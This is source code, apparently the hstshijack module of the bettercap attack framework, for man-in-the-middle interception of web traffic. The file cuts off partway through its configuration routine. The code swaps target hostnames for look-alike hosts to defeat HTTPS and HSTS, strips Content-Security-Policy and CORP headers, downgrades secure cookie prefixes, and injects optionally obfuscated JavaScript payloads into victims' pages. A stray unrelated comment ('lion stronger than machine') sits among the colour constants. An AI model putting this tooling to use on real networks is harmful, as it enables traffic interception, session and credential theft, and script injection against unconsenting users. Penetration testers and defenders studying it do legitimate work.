/**
 * Documentation can be found at https://github.com/bettercap/caplets/tree/master/hstshijack
 */

var ssl = {
	/* Prefix string mapped array of indexed domains. */
	index: {},
	/* Unicode hierarchy for domain names. */
	hierarchy: "-.0123456789abcdefghijklmnopqrstuvwxyz",
	/* Prefix hierarchy for domain names. */
	prefixes: ["www.","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9"],
};

var payload,
	payload_container_prefix =
		"if (!globalThis.{{SESSION_ID_TAG}}) {\n" +
			"globalThis.{{SESSION_ID_TAG}} = function() {\n",
	payload_container_suffix =
			"\n}\n" +
			"globalThis.{{SESSION_ID_TAG}}();\n" +
		"}\n";

var ignore_hosts = [],
	target_hosts = [],
	replacement_hosts = [],
	block_script_hosts = [],
	rx_sets_global_target_hosts = [], // host.com->nothost.com
	rx_sets_global_replacement_hosts = [], // nothost.com->host.com
	rx_sets_global_target_http_origins = [], // http://host.com->https://host.com
	rx_sets_whole_target_hosts = [], // ^host.com$->^nothost.com$
	rx_sets_whole_replacement_hosts = []; // ^nothost.com$->^host.com$

var payloads = {},
	obfuscate;

var replacements_req_body,
	replacements_req_headers,
	replacements_req_url_path,
	replacements_req_url_port,
	replacements_req_url_query,
	replacements_res_body,
	replacements_res_headers,
	rx_target_hosts_replacements_req_body = [],
	rx_target_hosts_replacements_req_headers = [],
	rx_target_hosts_replacements_req_url_path = [],
	rx_target_hosts_replacements_req_url_port = [],
	rx_target_hosts_replacements_req_url_query = [],
	rx_target_hosts_replacements_res_body_html = [],
	rx_target_hosts_replacements_res_body_javascript = [],
	rx_target_hosts_replacements_res_body_json = [],
	rx_target_hosts_replacements_res_headers = [];

var callback_path,
	whitelist_path,
	ssl_index_path,
	session_id,
	varname_target_hosts,
	varname_replacement_hosts;

var cookie_host_prefix,
	cookie_secure_prefix,
	rx_global_cookie_host_prefix,
	rx_global_cookie_secure_prefix,
	downgrade_cookies;

var ssl_discovery_delay,
	ssl_discovery_synchronous;

var math_seed;

var whitelist = {};

var rx_header_csp = /(?:x-webkit-csp|(?:x-)?content-security-policy)\s{0,100}:.*?\r\n/ig,
	rx_header_cspro = /content-security-policy-report-only\s{0,100}:.*?\r\n/ig,
	rx_header_corp = /cross-origin-resource-policy\s{0,100}:.*?\r\n/ig,
	rx_content_type_html = /text[/](?:html|xml)|application[/](?:hta|xhtml[+]xml|xml)/i,
	rx_content_type_js = /\S+\/javascript/i,
	rx_content_type_json = /\S+\/json/i,
	rx_doctype_html = /<!doctype\s{1,100}html>/i,
	rx_extension_html = /\.(?:html|htm|xml|xhtml|xhtm|xht|hta)$/i,
	rx_extension_js = /\.(?:[m]?js|js[x]?)$/i,
	rx_extension_json = /\.(?:json|map)$/i,
	rx_uri_one = /^https:\/\/[a-z0-9]/i,
	rx_uri_two = /^https:\/\/([^:/?#]+).*$/i,
	rx_http_origin = /^(http:\/\/[a-z0-9-.]+).*/i,
	rx_html_magic = /^\s{0,100}</g,
	rx_html_script_open_tag = /<script(\s|>)/ig,
	rx_html_script_close_tag = /<\/script(\s|>)/ig,
	rx_all_dashes = /-/g,
	rx_all_dots = /\./g,
	rx_scheme_http_https_colon = /(http)s:/ig,
	rx_semicolon_separator = /\s{0,100};\s{0,100}/,
	rx_port_https = /:443($|[^0-9])/g,
	rx_regset_wildcard_one = /^\*\./,
	rx_regset_wildcard_two = /\.\*$/,
	rx_regset_wildcard_three = /\.\*$/g,
	rx_regset_wildcard_four = /\.\*/g,
	rx_query_param = /^([^=]*)=(.*)$/,
	rx_cookie_host_prefix = /^__Host-/ig,
	rx_cookie_secure_prefix = /^__Secure-/ig;

var red = "\x1b[31m",
	yellow = "\x1b[33m",
	green = "\x1b[32m",
/* lion stronger than machine */
	blue = "\x1b[34m",
	on_white = "\x1b[47;30m",
	on_grey = "\x1b[40;37m",
	on_blue = "\x1b[104;30m",
	bold = "\x1b[1;37m",
	reset = "\x1b[0m";

/**
 * @param {Object} cookie - Cookie object.
 * @returns {String} header_value
 */
function cookieToResponseHeaderValue(cookie) {
	if (typeof cookie.name !== "string" || cookie.name === "") {
		log_error("error converting cookie to string: cookie has no name.");
		return "";
	}
	var cookie_string = "";
	if (typeof cookie.value === "string")
		cookie_string = cookie.name + "=" + cookie.value
	else return "";
	if (typeof cookie.domain === "string" && cookie.domain !== "")
		cookie_string += "; Domain=" + cookie.domain;
	if (typeof cookie.path === "string" && cookie.path !== "")
		cookie_string += "; Path=" + cookie.path;
	if (typeof cookie.expires === "string" && cookie.expires !== "")
		cookie_string += "; Expires=" + cookie.expires;
	if (typeof cookie.maxAge === "string" && cookie.maxAge !== "")
		cookie_string += "; Max-Age=" + cookie.maxAge;
	if (typeof cookie.priority === "string" && cookie.priority !== "")
		cookie_string += "; Priority=" + cookie.priority;
	if (typeof cookie.sameSite === "string" && cookie.sameSite !== "")
		cookie_string += "; SameSite=" + cookie.sameSite;
	if (cookie.secure === true) cookie_string += "; Secure";
	if (cookie.httpOnly === true) cookie_string += "; HttpOnly";
	if (cookie.partitioned === true) cookie_string += "; Partitioned";
	return cookie_string;
}

/**
 * @param {String} cookie_string - Cookie string (Set-Cookie header value).
 * @returns {Object} cookie
 */
function parseCookie(cookie_string) {
	var cookie_attrs = cookie_string.split(rx_semicolon_separator);
	if (cookie_attrs.length === 0) return null;
	var cookie = {
		name: "",
		value: "",
		domain: "",
		path: "",
		expires: "",
		maxAge: "",
		priority: "",
		sameSite: "",
		secure: false,
		httpOnly: false,
		partitioned: false,
	};
	cookie_attrs.forEach(function(attr, a) {
		var separator_index = attr.indexOf('=');
		var parts;
		if (separator_index !== -1)
			parts = [attr.slice(0, separator_index), attr.slice(separator_index + 1)]
		else parts = [attr];
		if (a === 0) {
			cookie.name = parts[0];
			if (parts.length === 2) cookie.value = parts[1];
		} else {
			switch (parts[0].toLowerCase()) {
			case "domain":
				if (parts.length === 2) cookie.domain = parts[1].toLowerCase();
				break;
			case "path":
				if (parts.length === 2) cookie.path = parts[1];
				break;
			case "expires":
				if (parts.length === 2) cookie.expires = parts[1];
				break;
			case "max-age":
				if (parts.length === 2) {
					var max_age = parseInt(parts[1]);
					if (max_age !== NaN) cookie.maxAge = max_age.toString();
				}
				break;
			case "priority":
				if (parts.length === 2) cookie.priority = parts[1];
				break;
			case "samesite":
				if (parts.length === 2) cookie.sameSite = parts[1];
				break;
			case "secure":
				cookie.secure = true;
				break;
			case "httponly":
				cookie.httpOnly = true;
				break;
			case "partitioned":
				cookie.partitioned = true;
				break;
			default:
				log_error("ignored an unexpected cookie attribute:", cookie_string);
				break;
			}
		}
	});
	if (cookie.name !== "") return cookie;
	log_error("cookie has no name:", cookie_string);
	return null;
}

function randomString(length) {
	length = parseInt(length);
	var chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
		buff  = new Array(length);
	for (var a = 0; a < buff.length; a++) {
		index = parseInt(Math.random() * chars.length);
		buff[a] = chars.charAt(index);
	}
	return buff.join("");
}

function toRegexp(selector_string, replacement_string) {
	return [
		new RegExp("(^|[^a-z0-9-.])" + selector_string.replace(rx_all_dots, "\\.") + "([^a-z0-9-.]|$)", "ig"),
		"$1" + replacement_string + "$2"
	];
}

function toHttpOriginRegexp(selector_string, replacement_string) {
	return [
		new RegExp("http://" + selector_string.replace(rx_all_dots, "\\.") + "([^a-z0-9-.]|$)", "ig"),
		"https://" + replacement_string + "$2"
	];
}

function toWholeRegexp(selector_string, replacement_string) {
	return [
		new RegExp("^" + selector_string.replace(rx_all_dots, "\\.") + "$", "ig"),
		replacement_string
	];
}

function toWildcardRegexp(selector_string, replacement_string) {
	selector_string = selector_string.replace(rx_all_dashes, "\\-");
	if (rx_regset_wildcard_one.test(selector_string)) {
		selector_string = selector_string.replace(rx_regset_wildcard_one, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)");
		selector_string = selector_string.replace(rx_all_dots, "\\.");
		selector_string = selector_string + "([^a-z0-9-.]|$)";
		replacement_string = replacement_string.replace(rx_regset_wildcard_one, "");
		return [
			new RegExp(selector_string, "ig"),
			"$1" + replacement_string + "$2"
		];
	} else if (rx_regset_wildcard_two.test(selector_string)) {
		selector_string = selector_string.replace(rx_regset_wildcard_three, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)");
		selector_string = selector_string.replace(rx_all_dots, "\\.");
		selector_string = "(^|[^a-z0-9-.])" + selector_string;
		replacement_string = replacement_string.replace(rx_regset_wildcard_two, "");
		return [
			new RegExp(selector_string, "ig"),
			"$1" + replacement_string + "$2"
		];
	} else {
		log_error(on_blue + "hstshijack" + reset + " Invalid toWildcardRegexp() value (got " + selector_string + ").");
	}
}

function toWildcardHttpOriginRegexp(selector_string, replacement_string) {
	selector_string = selector_string.replace(rx_all_dashes, "\\-");
	if (rx_regset_wildcard_one.test(selector_string)) {
		selector_string = selector_string.replace(rx_regset_wildcard_one, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)");
		selector_string = selector_string.replace(rx_all_dots, "\\.");
		selector_string = "http://" + selector_string + "([^a-z0-9-.]|$)";
		replacement_string = replacement_string.replace(rx_regset_wildcard_one, "");
		return [
			new RegExp(selector_string, "ig"),
			"https://$1" + replacement_string + "$2"
		];
	} else if (rx_regset_wildcard_two.test(selector_string)) {
		selector_string = selector_string.replace(rx_regset_wildcard_three, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)");
		selector_string = selector_string.replace(rx_all_dots, "\\.");
		selector_string = "http://" + selector_string;
		replacement_string = replacement_string.replace(rx_regset_wildcard_two, "");
		return [
			new RegExp(selector_string, "ig"),
			"https://" + replacement_string + "$1"
		];
	} else {
		log_error(on_blue + "hstshijack" + reset + " Invalid toWildcardHttpOriginRegexp() value (got " + selector_string + ").");
	}
}

function toWholeWildcardRegexp(selector_string, replacement_string) {
	selector_string = selector_string.replace(rx_all_dashes, "\\-");
	if (rx_regset_wildcard_one.test(selector_string)) {
		selector_string = selector_string.replace(rx_regset_wildcard_one, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)");
		selector_string = selector_string.replace(rx_all_dots, "\\.");
		replacement_string = replacement_string.replace(rx_regset_wildcard_one, "");
		return [
			new RegExp("^" + selector_string + "$", "ig"),
			"$1" + replacement_string
		];
	} else if (rx_regset_wildcard_two.test(selector_string)) {
		selector_string = selector_string.replace(rx_regset_wildcard_four, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)");
		selector_string = selector_string.replace(rx_all_dots, "\\.");
		replacement_string = replacement_string.replace(rx_regset_wildcard_two, "");
		return [
			new RegExp(selector_string, "ig"),
			replacement_string + "$1"
		];
	} else {
		log_error(on_blue + "hstshijack" + reset + " Invalid toWholeWildcardRegexp() value (got " + selector_string + ").");
	}
}

/* Matches /(^|[^a-z0-9-.])example\.com([^a-z0-9-.]|$)/ig */
function toRegexpSet(selector_string, replacement_string) {
	if (selector_string.indexOf("*") !== -1) {
		return toWildcardRegexp(selector_string, replacement_string);
	} else {
		return toRegexp(selector_string, replacement_string);
	}
}

/* Matches /http:\/\/example\.com([^a-z0-9-.]|$)/ig */
function toHttpOriginRegexpSet(selector_string, replacement_string) {
	if (selector_string.indexOf("*") !== -1) {
		return toWildcardHttpOriginRegexp(selector_string, replacement_string);
	} else {
		return toHttpOriginRegexp(selector_string, replacement_string);
	}
}

/* Matches ^example.com$ */
function toWholeRegexpSet(selector_string, replacement_string) {
	if (selector_string.indexOf("*") !== -1) {
		return toWholeWildcardRegexp(selector_string, replacement_string);
	} else {
		return toWholeRegexp(selector_string, replacement_string);
	}
}

/* Saves the list of domains using SSL, as well as its index ranges. */
function saveSSLIndex() {
	domains = [];
	for (a = 0; a !== ssl.prefixes.length; a++) {
		prefix = ssl.prefixes[a];
		domains = domains.concat(ssl.index[prefix]);
	}
	ssl.domains = domains;
	writeFile(env["hstshijack.ssl.domains"], domains.join("\n"));
	writeFile(env["hstshijack.ssl.index"], JSON.stringify(ssl.index));
}

/* Saves the whitelist. */
function saveWhitelist() {
	writeFile(env["hstshijack.whitelist"], JSON.stringify(whitelist));
}

/* Returns the amount of characters of an identical prefix of two given strings. */
function getMatchingPrefixLength(string1, string2) {
	count = 0;
	if (string1.length > string2.length) {
		for (a = 0; a !== string2.length; a++) {
			if (string1.charAt(a) !== string2.charAt(a)) {
				break;
			}
			count++;
		}
	} else {
		for (a = 0; a !== string1.length; a++) {
			if (string1.charAt(a) !== string2.charAt(a)) {
				break;
			}
			count++;
		}
	}
	return count;
}

/* Returns true if domain1 gets alphanumeric precendence over domain2. */
function getsPrecedence(domain1, domain2) {
	if (domain1.length > domain2.length) {
		/* If the first given domain is longer than the second. */
		for (a = 0; a !== domain2.length; a++) {
			rank1 = ssl.hierarchy.indexOf(domain1.charAt(a));
			rank2 = ssl.hierarchy.indexOf(domain2.charAt(a));
			if (rank1 > rank2) {
				return false;
			} else if (rank1 < rank2) {
				return true;
			}
		}
		return false;
	} else {
		/* If the second given domain is longer than the first. */
		for (a = 0; a !== domain1.length; a++) {
			rank1 = ssl.hierarchy.indexOf(domain1.charAt(a));
			rank2 = ssl.hierarchy.indexOf(domain2.charAt(a));
			if (rank1 > rank2) {
				return false;
			} else if (rank1 < rank2) {
				return true;
			}
		}
		return true;
	}
}

/* Returns the index of a given domain. */
function getDomainIndex(domain) {
	domain = domain.toLowerCase();
	for (a = 0; a !== ssl.prefixes.length; a++) {
		prefix = ssl.prefixes[a];
		if (domain.startsWith(prefix)) {
			return ssl.index[prefix].indexOf(domain);
		}
	}
}

/* Index a new domain. */
function indexDomain(domain) {
	domain = domain.toLowerCase();
	domain_prefix = "";
	for (a = 0; a !== ssl.prefixes.length; a++) {
		prefix = ssl.prefixes[a];
		if (domain.startsWith(prefix)) {
			domain_prefix = prefix;
			break;
		}
	}
	indexed_domains = ssl.index[domain_prefix];
	if (indexed_domains.indexOf(domain) === -1) {
		/* This domain is not indexed yet. */
		log_debug(on_blue + "hstshijack" + reset + " Indexing domain " + bold + domain + reset + " ...");
		if (indexed_domains.length !== 0) {
			for (a = 0; a < indexed_domains.length; a++) {
				indexed_domain = indexed_domains[a];
				if (getsPrecedence(domain, indexed_domain)) {
					ssl.index[domain_prefix] = indexed_domains.slice(0, a)
						.concat(domain)
						.concat(indexed_domains.slice(a, indexed_domains.length));
					saveSSLIndex();
					return;
				}
			}
			ssl.index[domain_prefix].push(domain);
		} else {
			ssl.index[domain_prefix] = [domain];
		}
		saveSSLIndex();
	} else {
		/* This domain is already indexed. */
		log_debug(on_blue + "hstshijack" + reset + " Skipped already indexed domain " + bold + domain + reset);
	}
}

function configure() {
	/* Read caplet. */
	env["hstshijack.ignore"]
		? ignore_hosts = env["hstshijack.ignore"].replace(/\s/g, "$1").split(",")
		: ignore_hosts = [];
	env["hstshijack.targets"]
		? target_hosts = env["hstshijack.targets"].replace(/\s/g, "$1").split(",")
		: target_hosts = [];
	env["hstshijack.replacements"]
		? replacement_hosts = env["hstshijack.replacements"].replace(/\s/g, "$1").split(",")
		: replacement_hosts = [];
	env["hstshijack.blockscripts"]
		? block_script_hosts = env["hstshijack.blockscripts"].replace(/^\s*(.*?)\s*$/g, "$1").split(",")
		: block_script_hosts = [];
	env["hstshijack.obfuscate"]
		? obfuscate = env["hstshijack.obfuscate"].replace(/^\s*(.*?)\s*$/g, "$1").toLowerCase() === "true" ? true : false
		: obfuscate = false;
	env["hstshijack.cookies.downgrade"]
		? downgrade_cookies = env["hstshijack.cookies.downgrade"].replace(/^\s*(.*?)\s*$/g, "$1").toLowerCase() === "true" ? true : false
		: downgrade_cookies = false;

	/* Validate caplet. */
	if (target_hosts.length < replacement_hosts.length) {
		log_fatal(on_blue + "hstshijack" + reset + " Too many hstshijack.replacements (got " + replacement_hosts.length + ").");
	}
	if (target_hosts.length > replacement_hosts.length) {
		log_fatal(on_blue + "hstshijack" + reset + " Not enough hstshijack.replacements (got " + replacement_hosts.length + ").");
	}
	if (target_hosts.indexOf("*") !== -1) {
		log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got *).");
	}
	if (replacement_hosts.indexOf("*") !== -1) {
		log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got *).");
	}

	var rx_whole_prefix_wildcard_domain = /^(?:\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/i;
	var rx_whole_suffix_wildcard_domain = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+\*$/i;
	for (a = 0; a < ignore_hosts.length; a++) {
		if (
			!/^\*$/i.test(ignore_hosts[a])
			&& !rx_whole_prefix_wildcard_domain.test(ignore_hosts[a])
			&& !rx_whole_suffix_wildcard_domain.test(ignore_hosts[a])
		) {
			log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.ignore value (got " + ignore_hosts[a] + ").");
		}
	}

	for (a = 0; a < target_hosts.length; a++) {
		if (
			!rx_whole_prefix_wildcard_domain.test(target_hosts[a])
			&& !rx_whole_suffix_wildcard_domain.test(target_hosts[a])
		) {
			log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got " + target_hosts[a] + ").");
		}

		if (
			!rx_whole_prefix_wildcard_domain.test(replacement_hosts[a])
			&& !rx_whole_suffix_wildcard_domain.test(replacement_hosts[a])
		) {
			log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got " + replacement_hosts[a] + ").");
		}

		if (/\*/g.test(target_hosts[a]) || /\*/g.test(replacement_hosts[a])) {
			target_host_wildcard_count      = target_hosts[a].match(/\*/g).length      || 0;
			replacement_host_wildcard_count = replacement_hosts[a].match(/\*/g).length || 0;
			if (target_host_wildcard_count !== replacement_host_wildcard_count) {
				log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets or hstshijack.replacements value, wildcards do not match (got " + target_hosts[a] + " and " + replacement_hosts[a] + ").");
			}
		}
	}

	for (a = 0; a < target_hosts.length; a++) {
		/* Precompile regex sets for hostname spoofing. */
		rx_sets_global_target_hosts.push(toRegexpSet(target_hosts[a], replacement_hosts[a]));
		rx_sets_global_replacement_hosts.push(toRegexpSet(replacement_hosts[a], target_hosts[a]));
		/* Precompile whole regex sets for hostname spoofing. */
		rx_sets_whole_target_hosts.push(toWholeRegexpSet(target_hosts[a], replacement_hosts[a]));
		rx_sets_whole_replacement_hosts.push(toWholeRegexpSet(replacement_hosts[a], target_hosts[a]));
		/* Precompile regex sets for restoring HTTPS. */
		rx_sets_global_target_http_origins.push(toHttpOriginRegexpSet(target_hosts[a], target_hosts[a]));
	}

	for (a = 0; a < block_script_hosts.length; a++) {
		if (
			!/^\*$/i.test(block_script_hosts[a])
			&& !rx_whole_prefix_wildcard_domain.test(block_script_hosts[a])
			&& !rx_whole_suffix_wildcard_domain.test(block_script_hosts[a])
		) {
			log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.blockscripts value (got " + block_script_hosts[a] + ").");
		}
	}

	/* Prepare response body regex replacements. */
	env["hstshijack.replacements.res.body"]
		? replacements_res_body_path = env["hstshijack.replacements.res.body"].replace(/^\s*(.*?)\s*$/g, "$1")
		: replacements_res_body_path = "";
	try {
		replacements_res_body = JSON.parse(readFile(replacements_res_body_path));
	} catch (err) {
		log_fatal(err);
	}
	if (!replacements_res_body.html || typeof replacements_res_body.html !== "object")
		replacements_res_body.html = {};
	if (!replacements_res_body.javascript || typeof replacements_res_body.javascript !== "object")
		replacements_res_body.javascript = {};
	if (!replacements_res_body.json || typeof replacements_res_body.json !== "object")
		replacements_res_body.json = {};
	var host_selector_strings_html = Object.keys(replacements_res_body.html);
	var host_selector_strings_javascript = Object.keys(replacements_res_body.javascript);
	var host_selector_strings_json = Object.keys(replacements_res_body.json);
	for (a = 0; a < host_selector_strings_html.length; a++) {
		var selector_string = host_selector_strings_html[a];
		if (selector_string === "*") {
			rx_target_hosts_replacements_res_body_html.push(new RegExp(".*"));
		} else {
			rx_target_hosts_replacements_res_body_html.push(
				toWholeRegexpSet(selector_string, "")[0]);
		}
		for (b = 0; b < replacements_res_body.html[selector_string].length; b++) {
			var rx_set = replacements_res_body.html[selector_string][b];
			replacements_res_body.html[selector_string][b] = [
				new RegExp(rx_set[0], rx_set[1]),
				rx_set[2],
			];
		}
	}
	for (a = 0; a < host_selector_strings_javascript.length; a++) {
		var selector_string = host_selector_strings_javascript[a];
		if (selector_string === "*") {
			rx_target_hosts_replacements_res_body_javascript.push(new RegExp(".*"));
		} else {
			rx_target_hosts_replacements_res_body_javascript.push(
				toWholeRegexpSet(selector_string, "")[0]);
		}
		for (b = 0; b < replacements_res_body.javascript[selector_string].length; b++) {
			var rx_set = replacements_res_body.javascript[selector_string][b];
			replacements_res_body.javascript[selector_string][b] = [
				new RegExp(rx_set[0], rx_set[1]),
				rx_set[2],
			];
		}
	}
	for (a = 0; a < host_selector_strings_json.length; a++) {
		var selector_string = host_selector_strings_json[a];
		if (selector_string === "*") {
			rx_target_hosts_replacements_res_body_json.push(new RegExp(".*"));
		} else {
			rx_target_hosts_replacements_res_body_json.push(
				toWholeRegexpSet(selector_string, "")[0]);
		}
		for (b = 0; b < replacements_res_body.json[selector_string].length; b++) {
			var rx_set = replacements_res_body.json[selector_string][b];
			replacements_res_body.json[selector_string][b] = [
				new RegExp(rx_set[0], rx_set[1]),
				rx_set[2],
			];
		}
	}

	/* Prepare request headers regex replacements. */
	env["hstshijack.replacements.req.headers"]
		? replacements_req_headers_filepath = env["hstshijack.replacements.req.headers"].replace(/^\s*(.*?)\s*$/g, "$1")
		: replacements_req_headers_filepath = "";
	try {
		replacements_req_headers = JSON.parse(readFile(replacements_req_headers_filepath));
	} catch (err) {
		log_fatal(err);
	}
	var host_selector_strings_req_headers = Object.keys(replacements_req_headers);
	for (a = 0; a < host_selector_strings_req_headers.length; a++) {
		var selector_string = host_selector_strings_req_headers[a];
		if (selector_string === "*") {
			rx_target_hosts_replacements_req_headers.push(new RegExp(".*"));
		} else {
			rx_target_hosts_replacements_req_headers.push(
				toWholeRegexpSet(selector_string, "")[0]);
		}
		for (b = 0; b < replacements_req_headers[selector_string].length; b++) {
			var rx_set = replacements_req_headers[selector_string][b];
			replacements_req_headers[selector_string][b] = [
				new RegExp(rx_set[0], rx_set[1]),
				rx_set[2],
			];
		}
	}

	/* Prepare request body regex replacements. */
	env["hstshijack.replacements.req.body"]
		? replacements_req_body_filepath = env["hstshijack.replacements.req.body"].replace(/^\s*(.*?)\s*$/g, "$1")
		: replacements_req_body_filepath = "";
	try {
		replacements_req_body = JSON.parse(readFile(replacements_req_body_filepath));
	} catch (err) {
		log_fatal(err);
	}
	var host_selector_strings_req_body = Object.keys(replacements_req_body);
	for (a = 0; a < host_selector_strings_req_body.length; a++) {
		var selector_string = host_selector_strings_req_body[a];
		if (selector_string === "*") {
			rx_target_hosts_replacements_req_body.push(new RegExp(".*"));
		} else {
			rx_target_hosts_replacements_req_body.push(
				toWholeRegexpSet(selector_string, "")[0]);
		}
		for (b = 0; b < replacements_req_body[selector_string].length; b++) {
			var rx_set = replacements_req_body[selector_string][b];
			replacements_req_body[selector_string][b] = [
				new RegExp(rx_set[0], rx_set[1]),
				rx_set[2],
			];
		}
	}

	/* Prepare request url regex replacements. */
	env["hstshijack.replacements.req.url"]
		? replacements_req_url_filepath = env["hstshijack.replacements.req.url"].replace(/^\s*(.*?)\s*$/g, "$1")
		: replacements_req_url_filepath = "";
	try {
		replacements_req_url_path = JSON.parse(readFile(replacements_req_url_filepath)).path;
		replacements_req_url_port = JSON.parse(readFile(replacements_req_url_filepath)).port;
		replacements_req_url_query = JSON.parse(readFile(replacements_req_url_filepath)).query;
	} catch (err) {
		log_fatal(err);
	}
	var host_selector_strings_req_url_path = Object.keys(replacements_req_url_path);
	var host_selector_strings_req_url_port = Object.keys(replacements_req_url_port);
	var host_selector_strings_req_url_query = Object.keys(replacements_req_url_query);
	for (a = 0; a < host_selector_strings_req_url_path.length; a++) {
		var selector_string = host_selector_strings_req_url_path[a];
		if (selector_string === "*") {
			rx_target_hosts_replacements_req_url_path.push(new RegExp(".*"));
		} else {
			rx_target_hosts_replacements_req_url_path.push(
				toWholeRegexpSet(selector_string, "")[0]);
		}
		for (b = 0; b < replacements_req_url_path[selector_string].length; b++) {
			var rx_set = replacements_req_url_path[selector_string][b];
			replacements_req_url_path[selector_string][b] = [
				new RegExp(rx_set[0], rx_set[1]),
				rx_set[2],
			];
		}
	}
	for (a = 0; a < host_selector_strings_req_url_port.length; a++) {
		var selector_string = host_selector_strings_req_url_port[a];
		if (selector_string === "*") {
			rx_target_hosts_replacements_req_url_port.push(new RegExp(".*"));
		} else {
			rx_target_hosts_replacements_req_url_port.push(
				toWholeRegexpSet(selector_string, "")[0]);
		}
		for (b = 0; b < replacements_req_url_port[selector_string].length; b++) {
			var rx_set = replacements_req_url_port[selector_string][b];
			replacements_req_url_port[selector_string][b] = [
				new RegExp(rx_set[0], rx_set[1]),
				rx_set[2],
			];
		}
	}
	for (a = 0; a < host_selector_strings_req_url_query.length; a++) {
		var selector_string = host_selector_strings_req_url_query[a];
		if (selector_string === "*") {
			rx_target_hosts_replacements_req_url_query.push(new RegExp(".*"));
		} else {
			rx_target_hosts_replacements_req_url_query.push(
				toWholeRegexpSet(selector_string, "")[0]);
		}
		for (b = 0; b < replacements_req_url_query[selector_string].length; b++) {
			var rx_set = replacements_req_url_query[selector_string][b];
			replacements_req_url_query[selector_string][b] = [
				new RegExp(rx_set[0], rx_set[1]),
				rx_set[2],
			];
		}
	}

	/* Prepare payloads. */
	env["hstshijack.payloads"]
		? payload_entries = env["hstshijack.payloads"].replace(/^\s*(.*?)\s*$/g, "$1").split(",")
		: payload_entries = [];
	for (a = 0; a < payload_entries.length; a++) {
		if (
			!/^\*:.+$/i.test(payload_entries[a])
			&& !/^(?:\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63}))):.+$/i.test(payload_entries[a])
			&& !rx_whole_suffix_wildcard_domain.test(payload_entries[a])
		) {
			log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.payloads value (got " + payload_entries[a] + ").");
		}
		payload_host = payload_entries[a].replace(/[:].*/, "");
		payload_path = payload_entries[a].replace(/.*[:]/, "");
		payload = "";
		if (!(payload = readFile(payload_path))) {
			log_fatal(on_blue + "hstshijack" + reset + " Could not read a payload (got " + payload_path + ").");
		} else {
			payload = payload
				.replace(/obf_hstshijack_target_hosts/g, varname_target_hosts)
				.replace(/obf_hstshijack_replacement_hosts/g, varname_replacement_hosts)
				.replace(/obf_hstshijack_path_callback/g, callback_path)
				.replace(/obf_hstshijack_path_ssl_index/g, ssl_index_path)
				.replace(/obf_hstshijack_path_whitelist/g, whitelist_path)
				.replace(/obf_hstshijack_cookie_host_prefix/g, cookie_host_prefix)
				.replace(/obf_hstshijack_cookie_secure_prefix/g, cookie_secure_prefix);
			if (obfuscate) {
				var obfuscation_variables = payload.match(/obf_hstshijack_[a-z0-9_]*/ig) || [];
	obfuscation_variables = obfuscation_variables.sort().reverse();
				for (b = 0; b < obfuscation_variables.length; b++) {
					if (obfuscation_variables.indexOf(obfuscation_variables[b]) === b) {
						regexp = new RegExp(obfuscation_variables[b], "g");
						payload = payload.replace(regexp, randomString(8 + (Math.random() * 8)));
					}
				}
			}
			if (payloads[payload_host]) {
				payloads[payload_host] = payloads[payload_host] + "\n" + payload + "\n";
			} else {
				payloads[payload_host] = payload + "\n";
			}
		}
	}

	/* Prepare payload container */
	payload_container_prefix = payload_container_prefix.replace(/\{\{SESSION_ID_TAG\}\}/g, session_id);
	payload_container_prefix = payload_container_prefix +
		"const " + varname_target_hosts + " = [\"" + target_hosts.join("\",\"") + "\"];\n" +
		"const " + varname_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"];\n";
	payload_container_suffix = payload_container_suffix.replace(/\{\{SESSION_ID_TAG\}\}/g, session_id);

	/* Prepare whitelist */
	whitelist_file_path = env["hstshijack.whitelist"];
	try {
		whitelist = JSON.parse(readFile(whitelist_file_path));
	} catch (err) {
		log_fatal(on_blue + "hstshijack" + reset + " Could not read whitelist file (got " + whitelist_file_path + "). Please enter a valid hstshijack.whitelist value in your caplet.");
	}

	/* Prepare SSL index */
	ssl_index_check = env["hstshijack.ssl.index.check"].toLowerCase() || "true";
	all_domains = readFile(env["hstshijack.ssl.domains"]).split("\n");
	for (a = 0; a !== ssl.prefixes.length; a++) {
		ssl.index[ssl.prefixes[a]] = [];
	}
	if (all_domains.length === 0) {
		log_info(on_blue + "hstshijack" + reset + " No indexed domains were found, index will be reset.");
	} else {
		if (ssl_index_check !== "false") {
			log_info(on_blue + "hstshijack" + reset + " Indexing SSL domains ...");
			all_domains.filter(function(domain) {
				if (domain !== "") indexDomain(domain);
			});
		} else {
			ssl.domains = all_domains;
			index_file_contents = readFile(env["hstshijack.ssl.index"]);
			if (ssl.domains.length !== 0 && index_file_contents === "") {
				log_fatal(on_blue + "hstshijack" + reset + " List of SSL domains is not indexed. Please set your hstshijack.ssl.index.check value to true in your caplet.");
			}
			try {
				ssl.index = JSON.parse(index_file_contents);
			} catch (err) {
				log_fatal(on_blue + "hstshijack" + reset + "(" + err + ") List of SSL domains is not indexed. Please set your hstshijack.ssl.index.check value to true in your caplet.");
			}
			indexed_domains_length = 0;
			for (a = 0; a !== ssl.prefixes.length; a++) {
